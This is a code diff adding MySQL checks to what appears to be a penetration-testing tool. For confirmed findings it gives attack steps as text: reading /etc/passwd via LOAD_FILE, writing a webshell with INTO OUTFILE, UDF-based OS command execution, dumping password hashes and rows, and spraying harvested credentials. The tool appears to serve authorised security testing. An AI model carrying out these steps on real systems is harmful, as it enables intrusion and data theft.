@@ -400,6 +400,42 @@ def _v_postgres(host, port, vuln):
         "FP only if the credential no longer works."]
 
 
+def _v_mysql(host, port, vuln):
+    # recce spoke the MySQL protocol itself - the empty-password login / credentialed
+    # login / FILE privilege / sampled sensitive rows are directly observed -> CONFIRMED.
+    b = _blob(vuln)
+    if "file privilege" in b or "load_file" in b or "outfile" in b:
+        return CONFIRMED, [
+            "recce read the connected account's grants and it HOLDS the FILE privilege "
+            "(directly observed) - arbitrary file read (LOAD_FILE), file write (INTO "
+            "OUTFILE), and UDF OS command exec as the mysql service account.",
+            "mysql -e \"SELECT LOAD_FILE('/etc/passwd')\" (read); SELECT ... INTO "
+            "OUTFILE '/var/www/shell.php' (write); or a lib_mysqludf_sys UDF into a "
+            "writable @@plugin_dir for command exec - within ROE.",
+            "FP only if secure_file_priv is NULL (file ops disabled) AND the plugin dir "
+            "is not writable."]
+    if "sensitive data" in b or "pii" in b:
+        return CONFIRMED, [
+            "recce authenticated, read information_schema, and sampled rows from columns "
+            "whose names denote secrets/PII - real data was returned (directly observed; "
+            "shown redacted).",
+            "Pull the full rows within ROE: mysql -e 'SELECT * FROM <db>.<table> LIMIT "
+            "100'; spray harvested connection strings.",
+            "FP only if the columns hold non-sensitive data despite their names."]
+    if "empty password" in b:
+        return CONFIRMED, [
+            "recce logged in with an EMPTY password over the MySQL protocol and the "
+            "server returned OK (directly observed) - full unauthenticated access.",
+            "mysql -h <ip> -u root ; SELECT user,authentication_string FROM mysql.user "
+            "(recce already read these).",
+            "FP only if the login was actually rejected (recce would not have raised this)."]
+    return CONFIRMED, [
+        "recce logged in with a credential from the engagement and the server returned a "
+        "session - the account has real database access (directly observed).",
+        "mysql -h <ip> -u <u> -p and enumerate / dump within ROE.",
+        "FP only if the credential no longer works."]
+
+
 def _v_elasticsearch(host, port, vuln):
     # recce GET /_cat/indices returned the index list with no credential -> CONFIRMED.
     b = _blob(vuln)
@@ -996,6 +1032,31 @@ _RECIPES: list[dict] = [
                "usename,passwd FROM pg_shadow (recce already read these).",
      "fp": "The login was actually rejected (recce would not have raised this).",
      "fn": _v_postgres},
+    {"id": "mysql-file-priv",
+     "match": r"mysql file privilege|load_file|into outfile",
+     "name": "MySQL FILE privilege (file read/write -> RCE)",
+     "pre": ["MySQL (3306) reachable", "The account holds the FILE privilege"],
+     "finish": "mysql -e \"SELECT LOAD_FILE('/etc/passwd')\" (read); INTO OUTFILE a "
+               "webshell; or a lib_mysqludf_sys UDF into a writable @@plugin_dir (ROE).",
+     "fp": "secure_file_priv is NULL and the plugin dir is not writable.",
+     "fn": _v_mysql},
+    {"id": "mysql-datamine",
+     "match": r"mysql sensitive data|mysql.*(pii|secrets|credentials)",
+     "name": "MySQL sensitive data exposed",
+     "pre": ["MySQL (3306) reachable", "Read access to databases with sensitive columns"],
+     "finish": "mysql -e 'SELECT * FROM <db>.<table> LIMIT 100' to pull the full rows; "
+               "spray harvested connection strings (ROE).",
+     "fp": "The flagged columns hold non-sensitive data despite their names.",
+     "fn": _v_mysql},
+    {"id": "mysql-access",
+     "match": r"mysql '.*' login with empty password|mysql credentialed access|"
+              r"mysql.*empty password",
+     "name": "MySQL empty-password / credentialed access",
+     "pre": ["MySQL (3306) reachable", "empty-password or a working credential"],
+     "finish": "mysql -h <ip> -u <u> ; SELECT user,authentication_string FROM mysql.user "
+               "(recce already read these).",
+     "fp": "The login was actually rejected (recce would not have raised this).",
+     "fn": _v_mysql},
     {"id": "elasticsearch-unauth",
      "match": r"elasticsearch exposed without authentication|elasticsearch.*(no auth|unauth)|"
               r"elasticsearch end-of-life|elasticsearch.*legacy build",
